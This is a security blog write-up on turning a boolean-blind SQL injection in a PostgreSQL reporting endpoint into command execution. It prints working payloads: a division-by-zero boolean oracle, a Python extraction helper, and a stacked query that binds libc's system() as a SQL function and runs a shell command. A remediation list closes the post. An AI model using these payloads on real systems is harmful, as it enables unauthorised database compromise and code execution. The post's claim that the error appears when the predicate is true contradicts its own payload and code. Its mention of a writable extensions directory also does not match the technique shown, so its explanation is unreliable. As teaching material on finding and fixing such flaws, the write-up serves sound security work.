---
title: "From blind SQL injection to RCE via stacked queries"
slug: blind-sqli-to-rce-via-stacked-queries
excerpt: "A boolean-blind injection in a reporting endpoint looked low-impact — until stacked queries and a writable extensions directory turned it into reliable code execution on PostgreSQL."
category: application-security
tags: [sqli, rce, postgres, python]
published: true
publishedAt: 2026-08-05
---

<h2>The bug</h2><p>The endpoint reflected nothing and returned only HTTP 200/500, but the 500 was conditional on the query — a textbook boolean-blind oracle.</p><pre><code class="language-http">GET /report?id=42 HTTP/1.1
Host: target.internal</code></pre><p>The parameter landed unescaped inside an <code>ORDER BY</code> clause, which is awkward for UNION but fine for boolean extraction:</p><pre><code class="language-sql">42 AND (SELECT CASE WHEN (current_setting('is_superuser')='on')
        THEN 1 ELSE 1/0 END)</code></pre><h3>Confirming superuser</h3><p>The division-by-zero flips the response to 500 only when the predicate is true, giving us a clean one-bit oracle. A short script automates extraction.</p><pre><code class="language-python">import requests

def oracle(payload):
    r = requests.get(URL, params={"id": f"42 AND ({payload})"})
    return r.status_code == 200   # 200 == predicate true

assert oracle("SELECT CASE WHEN current_setting('is_superuser')='on' THEN 1 ELSE 1/0 END")
print("[+] running as superuser")</code></pre><h2>Stacking toward RCE</h2><p>The driver allowed multiple statements. As superuser on an older PostgreSQL we can create a function over a writable shared library directory and call it.</p><pre><code class="language-sql">; CREATE FUNCTION sys(text) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE c STRICT;
SELECT sys('id > /tmp/p; chmod 666 /tmp/p');</code></pre><blockquote>Stacked queries plus a superuser role is almost always game over on PostgreSQL — the database is a code-execution surface, not just a data store.</blockquote><h2>Remediation</h2><ul><li>Never interpolate user input into <code>ORDER BY</code>; map to an allow-list of column names.</li><li>Run the application role as a low-privilege, non-superuser account.</li><li>Disable stacked queries at the driver where the workload does not need them.</li></ul>
